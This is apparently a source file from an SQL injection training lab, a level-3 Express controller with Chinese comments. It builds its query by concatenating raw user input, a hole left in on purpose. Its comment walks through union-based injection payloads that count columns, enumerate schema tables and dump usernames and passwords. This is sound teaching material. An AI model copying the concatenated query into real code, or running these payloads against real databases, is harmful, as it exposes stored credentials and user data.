const db = require('../../config/db');

/*
联合查询注入 (Union-Based Injection) 解题思路：

1. 这个挑战中使用了字符串拼接的方式构建SQL查询，存在注入漏洞
2. 查询的目标是根据作者名称查询文章
3. 解题步骤：
   a. 首先确定列数，可以使用 ORDER BY 命令: 
      ' ORDER BY 1-- -
      ' ORDER BY 2-- -
      直到出错为止，确定列数为3
   
   b. 使用UNION SELECT构造注入语句:
      ' UNION SELECT 1,2,3-- -
      
   c. 查询users表中的敏感信息:
      ' UNION SELECT id,username,password FROM users-- -
      
   d. 获取表名:
      ' UNION SELECT 1,2,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database()-- -
      
   e. 获取列名:
      ' UNION SELECT 1,2,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -

4. 成功的注入语句示例:
   ' UNION SELECT id,username,password FROM users-- -
*/

// 渲染SQL注入Level 3页面
exports.renderPage = (req, res) => {
  res.render('sqli/level3', {
    title: 'SQL注入 - Level 3 (联合查询注入)',
    activeMenu: 'sqli',
    result: null,
    error: null,
    query: ''
  });
};

// 处理SQL注入Level 3查询
exports.processQuery = async (req, res) => {
  const { author } = req.body;
  let result = null;
  let error = null;
  
  try {
    // 不安全的查询 - 直接拼接用户输入，没有过滤单引号
    const sql = `SELECT id, title, author FROM articles WHERE author = '${author}'`;
    
    // 尝试执行查询
    const pool = db.getPool();
    if (!pool) {
      throw new Error('数据库未连接');
    }
    
    const [rows] = await pool.execute(sql);
    result = rows;
  } catch (err) {
    console.error('SQL注入Level 3查询错误:', err);
    error = err.message;
  }
  
  res.render('sqli/level3', {
    title: 'SQL注入 - Level 3 (联合查询注入)',
    activeMenu: 'sqli',
    result,
    error,
    query: author
  });
}; 